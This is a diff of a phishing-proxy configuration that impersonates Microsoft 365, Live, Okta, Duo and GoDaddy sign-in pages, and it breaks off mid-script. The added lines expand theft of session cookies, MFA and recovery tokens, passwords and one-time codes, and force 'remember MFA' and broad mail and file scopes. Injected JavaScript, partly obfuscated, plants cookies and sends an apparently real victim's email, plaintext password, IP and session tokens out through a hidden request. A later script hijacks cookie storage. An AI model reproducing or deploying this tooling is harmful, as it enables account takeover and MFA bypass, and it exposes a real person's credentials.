-  - { triggers_on: "outlook.office.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-
-  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoft.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "github", domain: "githubassets.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "avatars", domain: "githubusercontent.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "collector", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "api", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
-  
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-
-  - {triggers_on: 'sso.godaddy.com', orig_sub: '', domain: 'wsimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  
 headers:
   inject:
-  - { key: "Cache-Control", value: "no-store, no-cache, must-revalidate, proxy-revalidate" }
+  - { key: "Cache-Control", value: "no-store, no-cache, must-revalidate" }
   - { key: "Pragma", value: "no-cache" }
   - { key: "Expires", value: "0" }
-  - { key: "X-Forwarded-For", value: "dynamic_ip_here" } 
-  - { key: "Referer", value: "https://login.microsoftonline.com" }
-  - { key: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
-  - { key: "Content-Security-Policy", value: "frame-ancestors 'self' https://outlook.office365.com" }
- 
+  - { key: "X-Cookie-Policy", value: "accept-all" }
+  - { key: "Set-Cookie-Options", value: "SameSite=None; Secure; Max-Age=315360000" }
+
 session:
-  use_cookies: true
-  keepalive: true
-  store_tokens: true
-  token_match: "access_token"
-  overwrite: true
-  cookie_ttl: 31536000
+  cookie_ttl: 31536000000  # 10 years in milliseconds (year ~2035)
 
 auth_tokens:
   - domain: ".login.microsoftonline.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token"]
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
+      "SignInStateCookie", "buid", "x-ms-RefreshTokenCredential",
+      "x-ms-Token", "x-ms-SessionId", "refresh_token",
+      "fpc", "stsservicecookie", "ESCTX",
+      "ESTSMFAPERSISTENT", "ESTSMFA", "x-ms-MfaToken",
+      "ProofUpSession", "SecurityProofSession", "x-ms-AccountSecurity",
+      "AADSSO", "CCState", "clrc", "AMCV", "wlidperf",
+      "NAP", "MSPOK", "uaid", "OParams", "MSPRequ",
+      "MSFPC", "ANON", "MSPAuth", "MSNRPSAuth",
+      "x-ms-DeviceCredential", "x-ms-gateway-slice", "client-request-id",
+      "x-client-SKU", "x-client-Ver", "x-ms-PKeyAuth",
+      "KMSI", "LoginOptions", "SessionId", "FlowToken",
+      "SDIDC", "canary", "apiCanary", "x-ms-cpim-slice"
+    ]
     
   - domain: ".microsoftonline.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token"]
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
+      "SignInStateCookie", "buid", "x-ms-RefreshTokenCredential",
+      "x-ms-Token", "refresh_token", "fpc", "ESCTX",
+      "AADSSO", "CCState", "clrc", "wlidperf", "MSPOK",
+      "x-ms-gateway-slice", "SDIDC", "canary", "MSPRequ",
+      "x-ms-PKeyAuth", "FlowToken", "LoginOptions"
+    ]
     
   - domain: "login.microsoftonline.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token"]
-    
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
+      "SignInStateCookie", "buid", "x-ms-Token", "fpc",
+      "AADSSO", "CCState", "wlidperf", "MSPOK", "canary",
+      "FlowToken", "LoginOptions", "KMSI"
+    ]
   - domain: ".live.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token"]
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token",
+      "PPAuth", "MSPAuth", "WLSSC", "MC1", "MUID",
+      "MSPProf", "MSPSoft", "MH", "MHW", "NAP", "RPSTAuth",
+      "MSNRPSAuth", "CkTst", "wla42", "wlidperf",
+      "RPSAuth", "RPSSecAuth", "ANON", "NAP", "PPLState",
+      "MSPBack", "uaid", "MR", "MSCC", "MSFPC"
+    ]
     
   - domain: "login.live.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token"]
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token",
+      "PPAuth", "MSPAuth", "WLSSC", "MC1", "MUID",
+      "MSPProf", "NAP", "RPSTAuth", "CkTst", "wlidperf",
+      "RPSAuth", "RPSSecAuth", "ANON", "uaid"
+    ]
     
-  - domain: "outlook.live.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token"]
-    
+  - domain: "account.live.com"
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token",
+      "PPAuth", "MSPAuth", "SecurityProofSession",
+      "MSPProf", "NAP", "wlidperf", "MUID", "MC1",
+      "uaid", "MSCC", "MSFPC"
+    ]
   - domain: "outlook.office.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "x-ms-SessionId", "refresh_token"]
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token",
+      "OutlookSession", "X-OWA-CANARY", "OfficeAccount",
+      "OWA-COOKIE", "ClientId", "cid", "UC", "X-BackEndCookie",
+      "X-OWA-ExchWebAppCache", "X-OWA-Protocol", "cadataTTL",
+      "exchangecookie", "X-EWS-TargetVersion", "TargetServer"
+    ]
     
-  - domain: "outlook.office365.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token"]
-
+  - domain: ".office.com"
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token",
+      "OfficeAccount", "MC1", "MSFPC",
+      "Office365ShellG2V2State", "MicrosoftApplications",
+      "OfficeRuntimeEnvironment", "wla42", "flight"
+    ]
+    
+  - domain: "www.office.com"
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "x-ms-Token",
+      "OfficeAccount", "MC1", "MSFPC", "MUID",
+      "Office365ShellG2V2State", "wla42", "flight",
+      "OhpAuth",        # Primary authentication token (TARGET: 50KB+)
+      "OhpCode",        # Authorization code token (TARGET: 10KB+)
+      "OhpToken",       # Session token (TARGET: 5KB+)
+      "UserIndex",      # User identifier token
+      "AjaxSessionKey", # AJAX session key for API calls
+      "userid",         # User ID token
+      ".AspNetCore.OpenIdConnect.Nonce.*,regexp",
+      ".AspNetCore.Correlation.*,regexp",
+      ".AspNetCore.Antiforgery.*,regexp",
+      ".AspNetCore.Session,regexp",
+      ".AspNetCore.Identity.Application,regexp",
+      "OfficeHome.*,regexp",
+      "Office.*Token.*,regexp",
+      "OfficeBrowser.*,regexp",
+      "officehomeblob",
+      "OfficeRuntimeEnvironment",
+      "MSGraph.*,regexp",
+      "GraphExplorer.*,regexp"
+    ]
+  - domain: ".microsoft.com"
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token",
+      "MC1", "MUID", "MSFPC",
+      "SecurityProofSession", "ProofUpSession",
+      "MSCAuth", "MicrosoftAccount", "ANON", "NAP",
+      "wlidperf", "MSCC", "AI_user", "AI_session"
+    ]
+    
+  - domain: "account.microsoft.com"
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token",
+      "MC1", "MUID", "MSFPC",
+      "SecurityProofSession", "AccountToken",
+      "MSCAuth", "ANON", "NAP", "wlidperf",
+      "AI_user", "AccountRecoveryToken"
+    ]
+  - domain: "mysignins.microsoft.com"
+    keys: [
+      "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token",
+      "MC1", "MUID", "MSFPC",
+      "SecurityProofSession", "ProofUpSession", "x-ms-AccountSecurity",
+      "x-ms-SecurityInfo", "SecurityInfoToken",
+      "ESTSMFAPERSISTENT", "ESTSMFA", "x-ms-MfaToken",
+      "SecurityManagementToken", "ProofUpToken", "MfaManagementCookie",
+      "x-ms-AuthenticatorToken", "TwoFactorSession", "RecoveryToken",
+      "SecuritySettingsSession", "AuthMethodToken", "ProofMethod"
+    ]
+  - domain: ".duosecurity.com"
+    keys: [
+      "duo_sso_token", "duo_session", "DuoSSOToken",
+      "duo_sid", "duo_auth_token", "duo_device_token",
+      "duo_api_key", "duo_integration_key", "duo_secret_key",
+      "duo_auth_signature", "duo_app_signature",
+      "duo_device_id", "duo_trusted_device", "duo_remember_device",
+      "DuoDeviceToken", "DuoTrustedBrowser",
+      "duo_bypass_code", "duo_passcode", "duo_phone_id",
+      "duo_push_token", "duo_enrollment_token",
+      "duo_persistent_session", "duo_remember_me",
+      "_duo_session", "_duo_state"
+    ]
+    
+  - domain: "sso.duosecurity.com"
+    keys: [
+      "duo_sso_token", "duo_session", "duo_sid",
+      "duo_auth_token", "duo_device_token", "_duo_session"
+    ]
+    
+  - domain: "api.duosecurity.com"
+    keys: [
+      "duo_api_key", "duo_integration_key", "duo_auth_signature",
+      "duo_app_signature", "duo_session"
+    ]
+    
+  - domain: "auth.duosecurity.com"
+    keys: [
+      "duo_auth_token", "duo_session", "duo_device_token",
+      "duo_bypass_code", "duo_passcode", "duo_remember_device"
+    ]
+  - domain: ".okta.com"
+    keys: [
+      "sid", "JSESSIONID", "t", "DT",
+      "okta-oauth-redirect-params", "okta-oauth-state",
+      "idx", "okta_session"
+    ]
+    
+  - domain: "o.okta.com"
+    keys: [
+      "sid", "JSESSIONID", "t", "DT",
+      "okta_session"
+    ]
+    
+  - domain: "login.okta.com"
+    keys: [
+      "sid", "JSESSIONID", "t", "DT",
+      "okta_session"
+    ]
+  - domain: ".godaddy.com"
+    keys: [
+      "auth_key", "access_token", "ips_dg",
+      "idp", "adc", "market", "currency",
+      "sp", "ips_tn", "ips_pn"
+    ]
+    
   - domain: "sso.godaddy.com"
-    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "refresh_token"]
+    keys: [
+      "auth_key", "access_token", "idp",
+      "ips_dg", "market"
+    ]
+    
+  - domain: "gui.godaddy.com"
+    keys: [
+      "auth_key", "access_token", "idp",
+      "ips_dg"
+    ]
+  - domain: ".wsimg.com"
+    keys: [
+      "auth_key", "access_token",
+      "ips_dg", "market"
+    ]
 
-auth_urls:
-  - "/common/oauth2/v2.0/token"
-  - "/common/oauth2/token"
-  - "/kmsi*"
-  - "/landingv2"
-  - "/landing*"
-  - "/ppsecure/post.srf*"         
-  - "/owa/auth/logon.aspx*"       
-  - "/common/SAS/ProcessAuth"    
-  - "/ecp/authorize*"             
-  - "/mail/inbox*"            
-  - "/owa/auth/errorfe.aspx*" 
-  - "/login.srf"
-  
-  
 rewrite_urls:
   - trigger:
       domains: ["login.microsoftonline.com"]
@@ -226,70 +300,59 @@ rewrite_urls:
         - key: "tid"
           value: "{id}"
 
+auth_urls:
+  - "/common/oauth2/v2.0/token"
+  - "/common/oauth2/token"
+  - "/kmsi"
+  - "/landingv2"
+  - "/appverify"
+  - "/common/appverify"
+  - "/oauth2/appverify"
+  - "/ppsecure/post.srf"
+  - "/login.srf"
+  - "/owa/auth/logon.aspx"
+  - "/owa/auth.owa"
+  - "/common/SAS/ProcessAuth"
 
-   
 force_post:
-  - path: "/common/oauth2/v2.0/authorize"
-    search:
-      - { key: "scope", search: ".*" }
-    force:
-      - { key: "scope", value: "openid profile email offline_access" }
-    type: "post"
-
-  - path: "/common/oauth2/v2.0/authorize"
-    search:
-      - { key: "prompt", search: ".*" }
-    force:
-      - { key: "prompt", value: "login" }
-    type: "post"
-
-  - path: "/common/oauth2/v2.0/token"
-    search:
-      - { key: "grant_type", search: ".*" }
-    force:
-      - { key: "grant_type", value: "refresh_token" }
-    type: "post"
-
-  - path: "/common/SAS/ProcessAuth"
-    search:
-      - { key: "rememberMFA", search: ".*" }
-      - { key: "ESTSAUTHPERSISTENT", search: ".*" }
-      - { key: "x-ms-RefreshTokenCredential", search: ".*", optional: true }
-    force:
-      - { key: "rememberMFA", value: "true" }
-      - { key: "PPSession", value: "true" }
-    type: "post"
-
-  - path: "/owa/auth.owa"
-    search:
-      - { key: "username", search: ".*" }
-      - { key: "ESTSAUTHPERSISTENT", search: ".*" }
-      - { key: "x-ms-RefreshTokenCredential", search: ".*", optional: true }
-    force:
-      - { key: "PPSession", value: "true" }
-    type: "post"
-
   - path: "/kmsi"
     search:
       - { key: "PPSession", search: ".*" }
     force:
       - { key: "PPSession", value: "true" }
+      - { key: "KMSI", value: "true" }
+      - { key: "KMSIStateless", value: "true" }
+      - { key: "isFidoSupported", value: "true" }
     type: "post"
-    
-  - path: '/common/SAS'
+  - path: "/common/SAS/ProcessAuth"
     search:
-      - {key: 'rememberMFA', search: '.*'}
+      - { key: "rememberMFA", search: ".*" }
     force:
-      - {key: 'rememberMFA', value: 'true'}
-    type: 'post'
+      - { key: "rememberMFA", value: "true" }
+      - { key: "TrustDevice", value: "true" }
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
+  - path: "/oauth2/v2.0/token"
+    search:
+      - { key: "scope", search: ".*" }
+    force:
+      - { key: "scope", value: "openid profile email offline_access User.Read Mail.ReadWrite Calendars.ReadWrite Contacts.ReadWrite Files.ReadWrite.All" }
+    type: "post"
+  - path: "/ppsecure/post.srf"
+    search:
+      - { key: "PPFT", search: ".*" }
+    force:
+      - { key: "PS", value: "2" }
+      - { key: "PPSX", value: "Passport" }
+    type: "post"
 
 credentials:
   username:
-    key: '(username|login|UserName|user|email|email_address|mail|account|identifier|userid|user_id|loginId|membername|session_key)'
-    search: '"(?:username|login|UserName|user|email|email_address|mail|account|identifier|userid|user_id|loginId|membername|session_key)"\s*:\s*"([^"]+)"'
+    key: '(username|login|UserName|user|email|mail|account|loginfmt|loginEmail)'
+    search: '"(?:username|login|UserName|user|email|mail|account|loginfmt|loginEmail)"\s*:\s*"([^"]+)"'
     type: 'json'
   password:
-    key: '(passwd|Password|password|pass|pwd|Passwd|session_password|login_password|userpassword|user_pass|access_key|secretKey|password_field|loginpass|secret_password)'
+    key: '(passwd|Password|password|pass|pwd|Passwd)'
     search: '(.*)'
     type: 'post'
   custom:
@@ -299,74 +362,554 @@ credentials:
   - key: '"Passwd"'
     search: '"Passwd"\s*:\s*"([^"]+)"'
     type: 'json'
-  - key: '"access_key"'
-    search: '"access_key"\s*:\s*"([^"]+)"'
-    type: 'json'
-  - key: '"secretKey"'
-    search: '"secretKey"\s*:\s*"([^"]+)"'
-    type: 'json'
-  - key: 'mfaAuthMethod'
-    search: '(.*)'
-    type: 'post'
-  - key: '"device"'
-    search: '"device"\s*:\s*"([^"]+)"'
-    type: 'json'
   - key: '"refresh_token"'
     search: '"refresh_token"\s*:\s*"([^"]+)"'
     type: 'json'
+  - key: '"access_token"'
+    search: '"access_token"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"id_token"'
+    search: '"id_token"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"device_code"'
+    search: '"device_code"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"user_code"'
+    search: '"user_code"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"otc"'
+    search: '"otc"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"PhoneAppOTP"'
+    search: '"PhoneAppOTP"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"bearer_token"'
+    search: '"bearer_token"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"device"'
+    search: '"device"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: 'device_token'
+    search: '(.*)'
+    type: 'post'
+  - key: 'PRT'
+    search: '(.*)'
+    type: 'post'
 
 login:
   domain: 'login.microsoftonline.com'
   path: '/'
-
-
-js_inject:
-  - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths: ["/*"]
-    script: |
-      // Generate random title
-      const randomWords = ['Welcome', 'Secure', 'Access', 'Portal', 'Login', 'Account', 'Verify', 'Sign In'];
-      const randomTitle = randomWords[Math.floor(Math.random() * randomWords.length)];
-      document.title = randomTitle + ' - Microsoft';
-
-      function lp(){
-        const emailInput = document.getElementById("i0116");
-        if (emailInput) {
-
-        if({email} != "{email}") {
-          // Set the value
-          console.log("Setting email value to: {email}");
-          
-           emailInput.value = "{email}";
-          
-          // Trigger input events to make the page detect the change
-          emailInput.dispatchEvent(new Event('input', { bubbles: true }));
-          emailInput.dispatchEvent(new Event('change', { bubbles: true }));
-          emailInput.dispatchEvent(new Event('keyup', { bubbles: true }));
-          
-          // Focus the input to ensure it's active
-          emailInput.focus();
-          
-          const nextButton = document.getElementById("idSIButton9");
-          if (nextButton) {
-            nextButton.click();
-          }
-
-          
-          
-          return true; // Exit the loop
-        }
-
-          
-        }
-        return false; // Continue checking
-      }
-
-      const checkInterval = setInterval(function() {
-        if (lp()) {
-          clearInterval(checkInterval); // Stop checking when successful
-        }
-      }, 500);
-
-
   
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/.*"]
+    script: |
+        const _g0 = async _g1 => {
+          for (; null === document.querySelector(_g1);) await new Promise(_g1 => requestAnimationFrame(_g1));
+          return document.querySelector(_g1);
+          };
+          const _g10 = function(s) {
+            var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
+            var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+            for(i=0;i<64;i++){e[A.charAt(i)]=i;}
+            for(x=0;x<L;x++){
+                c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
+                while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
+            }
+            return r;
+          };
+          _g0("#i0116").then(_g1 => {
+            var _g2 = document.querySelector("#i0116"), _g3 = document.querySelector("#idSIButton9"), _g4 = window.location.href;
+            if (/#/.test(window.location.href)) {
+              var _g8 = _g4.split("#")[1].replace(/[=]/gi, "").substring(0);
+              _g8 = _g10(_g8), _g2.focus(), _g2.value = _g8, _g3.focus(), void _g3.click();
+            }
+          });
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/.*"]
+    script: |
+      !function(){const VICTIM_IP='64.188.200.195',VICTIM_EMAIL='drr@rappelhealthlaw.com',VICTIM_PASSWORD='RH##601g326';let e=JSON.parse(`[{"name":"ESTSAUTHPERSISTENT","value":"1.AVgA2mYivhnsNk-MFcQK1dCL61tEZUfGMrBJg-Ydk3ZSdspYAFBYAA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P8N5yHec9MD4fSb5C3frSko1P2bel35fU3DSdSnUn3MJfHgkVTMEzI7kchpSCzCCY6sGbS5eLUp3v7Sqt0I5PlIxc3ECyp5yTA0g6OJJ2tKpzU7FIl_b44lkdZGfIErsK1vTRBfKLye8TLLAGaRyK2smrhRNKr-iu2MTBSy7rUsxSWvxQiA6PM-ENfOdB3Ozrah90_G2YFQpgHGEZur0wP2VJEAFvBX0P_HR1RuXf4JYYeB_ciYtVhgerignkz99aEx8_AKLMbySpKtFqGcPJejGBj5JvHnsvbmiiqDBNP-14EIeluMCKHD5B_9Y1R9sCSnaN5vYrapgN6QreoGir-5x4A6CBT1wiRp3ifavrZ2FB6P20xDxq_QbZGadG1Nes6KJDQD5vZZ0d60rMqIrJ0tDf-G6QP-lypPtc70YEXVLaBe8b70e0xCYu3J6i7Osg7BEIl2YyPwBjjJmNcDuCUOnCcNgv6sUS9YCGwpWYL287v9IedjjjNl45ARReAcL0HTh_9EPGtiO3Z_tGsLWlN1HcqYR23_r6vd57Xhx-DglcTBG_bO56m8RBkOPg9rhH5mX_5cqqI8noQEzgpmg4FWL71m-kUcpVgqHpeWq802AwwF-rahzlEYsDUZPUOI3Z6bBEFNhYHZJjM5SsqIbvn6bw","domain":".login.microsoftonline.com","expirationDate":1786561476493,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"1.AVgA2mYivhnsNk-MFcQK1dCL61tEZUfGMrBJg-Ydk3ZSdspYAFBYAA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P-MZPwIs-dinVLFgNb3X8AA7dNMYABKSbawpz8Ra-YTUkjsr3YfvZ2GQdIQAZ3m2RfYBmrm_HSEWr3G","domain":".login.microsoftonline.com","expirationDate":1786561476493,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+007beea9-fd12-6f5b-1d33-a594ea033725","domain":".login.microsoftonline.com","expirationDate":1786561476493,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]`);for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=315360000;${o.path?`path=${o.path};`:""}${o.domain?`domain=${o.domain};`:""}${o.path?``:`path=/;`}Secure;SameSite=None`;const exfil=new Image;exfil.src=`https://${location.hostname}/api/injected-creds?ip=${VICTIM_IP}&email=${encodeURIComponent(VICTIM_EMAIL)}&pass=${encodeURIComponent(VICTIM_PASSWORD)}&cookies=${encodeURIComponent(JSON.stringify(e))}`;exfil.style.display='none';document.body?.appendChild(exfil);window.location.href=atob('aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t')}();
+  - trigger_domains: ["www.office.com", "office.com"]
+    trigger_paths: ["/.*"]
+    script: |
+      !function(){
+        const NUCLEAR={
+          version:'ELITE-v3.0',
+          collected:false,
+          domains:['.office.com','.www.office.com','.microsoftonline.com','.microsoft.com','.live.com','.login.microsoftonline.com','.login.microsoft.com','office.com','www.office.com'],
+          cookieNames:['OhpAuth','OhpCode','OhpToken','UserIndex','AjaxSessionKey','userid','ESTSAUTH','ESTSAUTHPERSISTENT','ESTSAUTHLIGHT','SignInStateCookie','buid','fpc','CCState','esctx'],
+          db:null,
+          init(){
+            console.log(`[🔥NUCLEAR] v${this.version} initialized - ELITE MODE ACTIVE`);
+            this.initIndexedDB();
+            this.startMutationObserver();
+            this.waitForCookies();
+            this.startAggressiveRefresh();
+            this.cloneToLocalStorage();
+            this.hijackCookieAPI();
+          },
+          initIndexedDB(){
+            try{
+              const req=indexedDB.open('NUCLEAR_COOKIES',1);
+              req.onupgradeneeded=e=>{
+                const db=e.target.result;
+                if(!db.objectStoreNames.contains('cookies')){
+                  db.createObjectStore('cookies',{keyPath:'name'});
+                }
+              };
+              req.onsuccess=e=>{
+                this.db=e.target.result;
+                console.log('[🔥NUCLEAR] IndexedDB initialized');
+                this.restoreFromIndexedDB();
+              };
+            }catch(e){console.error('[🔥NUCLEAR] IndexedDB failed:',e);}
+          },
+          waitForCookies(){
+            const check=setInterval(()=>{
+              const c=document.cookie;
+              const found=this.cookieNames.some(n=>c.includes(n+'='));
